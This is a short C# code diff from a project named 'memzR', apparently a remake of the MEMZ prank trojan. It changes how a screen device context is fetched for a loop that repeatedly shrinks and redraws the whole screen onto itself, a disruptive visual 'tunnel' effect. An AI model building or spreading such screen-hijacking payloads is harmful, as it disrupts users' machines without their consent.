@@ -508,8 +508,7 @@ namespace memzR
             {
                 int x = Screen.PrimaryScreen.Bounds.Width;
                 int y = Screen.PrimaryScreen.Bounds.Height;
-                IntPtr hwnd = GetDesktopWindow();
-                IntPtr hdc = GetWindowDC(hwnd);
+                IntPtr hdc = GetDC(IntPtr.Zero);
                 StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, SRCCOPY);
                 Thread.Sleep(200);
             }
